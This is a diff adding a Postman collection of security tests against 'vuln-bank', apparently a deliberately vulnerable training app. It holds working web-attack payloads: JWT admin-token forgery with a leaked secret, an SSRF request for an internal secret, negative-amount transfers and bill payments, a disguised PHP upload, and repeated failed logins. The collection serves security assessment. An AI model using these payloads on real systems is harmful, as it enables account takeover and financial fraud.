@@ -1,0 +1,592 @@
+{
+  "info": {
+    "_postman_id": "095b5957-5ee3-4754-b2d3-4c2b2b5c9e34",
+    "name": "vuln-bank Security Tests - Joeassessment1",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "39541371"
+  },
+  "item": [
+    {
+      "name": "Authentication & Authorization",
+      "item": [
+        {
+          "name": "Login - Get Token",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "// Check if login was successful\r",
+                  "if (pm.response.code === 200) {\r",
+                  "    // Get the response data\r",
+                  "    var jsonData = pm.response.json();\r",
+                  "    \r",
+                  "    // Save the token to the environment variable\r",
+                  "    pm.environment.set(\"jwt_token\", jsonData.token);\r",
+                  "    \r",
+                  "    // Log success to console\r",
+                  "    console.log(\"✅ Token saved successfully!\");\r",
+                  "    \r",
+                  "    // Optional: Save account info too\r",
+                  "    pm.environment.set(\"account_number\", jsonData.accountNumber);\r",
+                  "}"
+                ],
+                "type": "text/javascript",
+                "packages": {},
+                "requests": {}
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n  \"username\": \"Joeassessment1\",\r\n  \"password\": \"Peace@91\"\r\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "login"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "F3 - JWT Token Decode & Verify",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "// Get the token from environment\r",
+                  "let token = pm.environment.get(\"jwt_token\");\r",
+                  "\r",
+                  "// Decode the payload (middle part)\r",
+                  "let base64Url = token.split('.')[1];\r",
+                  "let base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');\r",
+                  "let payload = JSON.parse(atob(base64));\r",
+                  "\r",
+                  "// Log to console\r",
+                  "console.log(\"🔑 JWT Payload:\", payload);\r",
+                  "\r",
+                  "// Check if token has expiration\r",
+                  "if (payload.exp) {\r",
+                  "    console.log(\"✅ Token expires at:\", new Date(payload.exp * 1000));\r",
+                  "} else {\r",
+                  "    console.log(\"❌ WARNING: Token has NO expiration!\");\r",
+                  "}\r",
+                  "\r",
+                  "// Check if is_admin\r",
+                  "if (payload.is_admin) {\r",
+                  "    console.log(\"👑 Admin token detected!\");\r",
+                  "} else {\r",
+                  "    console.log(\"👤 Regular user token\");\r",
+                  "}\r",
+                  "\r",
+                  "// Save to environment for reference\r",
+                  "pm.environment.set(\"decoded_payload\", JSON.stringify(payload));"
+                ],
+                "type": "text/javascript",
+                "packages": {},
+                "requests": {}
+              }
+            }
+          ],
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": ""
+            },
+            "url": {
+              "raw": "{{base_url}}/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "dashboard"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "F3b - JWT Admin Token Forgery",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "exec": [
+                  "// Get current token\r",
+                  "let originalToken = pm.environment.get(\"jwt_token\");\r",
+                  "\r",
+                  "// Decode the payload\r",
+                  "let parts = originalToken.split('.');\r",
+                  "let header = JSON.parse(atob(parts[0]));\r",
+                  "let payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));\r",
+                  "\r",
+                  "// Modify payload to make admin\r",
+                  "payload.is_admin = true;\r",
+                  "\r",
+                  "// Also add expiration (optional but more realistic)\r",
+                  "payload.exp = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now\r",
+                  "\r",
+                  "// Encode back to base64\r",
+                  "let newHeader = btoa(JSON.stringify(header));\r",
+                  "let newPayload = btoa(JSON.stringify(payload))\r",
+                  "    .replace(/\\+/g, '-')\r",
+                  "    .replace(/\\//g, '_')\r",
+                  "    .replace(/=/g, '');\r",
+                  "\r",
+                  "// Secret (from our SSRF finding)\r",
+                  "let secret = \"secret123\";\r",
+                  "\r",
+                  "// For HS256, we need to sign it\r",
+                  "// Postman can't sign JWTs directly, so we'll show the forged token in console\r",
+                  "console.log(\"🔧 FORGED ADMIN TOKEN (unsigned):\");\r",
+                  "console.log(newHeader + \".\" + newPayload);\r",
+                  "\r",
+                  "console.log(\"\\n📝 TO USE:\");\r",
+                  "console.log(\"1. Go to https://jwt.io\");\r",
+                  "console.log(\"2. Paste this token\");\r",
+                  "console.log(\"3. Add secret: \" + secret);\r",
+                  "console.log(\"4. Copy signed token\");\r",
+                  "console.log(\"5. Use in Authorization header\");\r",
+                  "\r",
+                  "// Save unsigned token to environment\r",
+                  "pm.environment.set(\"forged_token_unsigned\", newHeader + \".\" + newPayload);"
+                ],
+                "type": "text/javascript",
+                "packages": {},
+                "requests": {}
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "console.log(\"\\n📊 CURRENT TOKEN vs FORGED TOKEN:\");\r",
+                  "console.log(\"Original is_admin:\", pm.environment.get(\"jwt_token\").includes('\"is_admin\":true') ? \"✅ Admin\" : \"👤 Regular\");\r",
+                  "console.log(\"Check console above for forged token instructions\");"
+                ],
+                "type": "text/javascript",
+                "packages": {},
+                "requests": {}
+              }
+            }
+          ],
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"image_url\": \"http://localhost:5000/internal/secret\"\r\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "dashboard"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "F3c - Test Forged Admin Token",
+          "protocolProfileBehavior": {
+            "disableBodyPruning": true
+          },
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "GET",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"image_url\": \"http://localhost:5000/internal/secret\"\r\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/dashboard",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "dashboard"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Money Transfer Hacks",
+      "item": [
+        {
+          "name": "F4 - Negative Money Transfer",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"to_account\": \"3377983109\",\r\n    \"amount\": -500,\r\n    \"description\": \"Negative transfer test\"\r\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/transfer",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "transfer"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "F5 - Negative Bill Payment",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"biller\": \"TeleCom Services\",\r\n    \"amount\": -50,\r\n    \"description\": \"Negative bill test\"\r\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/billers",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "billers"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "File Upload & SSRF",
+      "item": [
+        {
+          "name": "F1 - Unrestricted File Upload",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "formdata",
+              "formdata": [
+                {
+                  "key": "profile_picture",
+                  "description": "hack.php.jpg",
+                  "type": "file",
+                  "uuid": "07358044-f1a2-43b9-bd9a-cf22f3d44395",
+                  "src": "postman-cloud:///1f1135ea-2396-4500-822a-2d334b60ba22"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{base_url}}/upload_profile_picture",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "upload_profile_picture"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "F2 - SSRF Internal Secret",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"image_url\": \"http://localhost:5000/internal/secret\"\r\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/upload_profile_picture_url",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "upload_profile_picture_url"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Bill Payments",
+      "item": [
+        {
+          "name": "F5 - Attempt Negative Bill Payment",
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"biller_id\": 1,\r\n    \"amount\": -50,\r\n    \"payment_method\": \"balance\",\r\n    \"description\": \"Negative bill test\"\r\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/pay_bill",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "pay_bill"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "Rate Limiting & Session",
+      "item": [
+        {
+          "name": "F8 - Rate Limiting Test (Multiple Login Attempts)",
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "exec": [
+                  "// This will run before each request\r",
+                  "console.log(\"Attempt \" + (pm.info.iteration || 1) + \" at \" + new Date().toLocaleTimeString());"
+                ],
+                "type": "text/javascript",
+                "packages": {},
+                "requests": {}
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "// Check if rate limiting is working\r",
+                  "if (pm.response.code === 429) {\r",
+                  "    console.log(\"✅ RATE LIMITING DETECTED! Request blocked.\");\r",
+                  "    pm.environment.set(\"rate_limiting_detected\", \"true\");\r",
+                  "} else if (pm.response.code === 200 || pm.response.code === 401) {\r",
+                  "    console.log(\"❌ No rate limiting - request \" + (pm.info.iteration || 1) + \" accepted\");\r",
+                  "} else {\r",
+                  "    console.log(\"Response code: \" + pm.response.code);\r",
+                  "}"
+                ],
+                "type": "text/javascript",
+                "packages": {},
+                "requests": {}
+              }
+            }
+          ],
+          "request": {
+            "auth": {
+              "type": "bearer",
+              "bearer": [
+                {
+                  "key": "token",
+                  "value": "{{jwt_token}}",
+                  "type": "string"
+                }
+              ]
+            },
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\r\n    \"username\": \"Joeassessment1\",\r\n    \"password\": \"wrongpassword\"\r\n}"
+            },
+            "url": {
+              "raw": "{{base_url}}/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "login"
+              ]
+            }
+          },
+          "response": []
+        }
+      ]
+    }
+  ]
+}
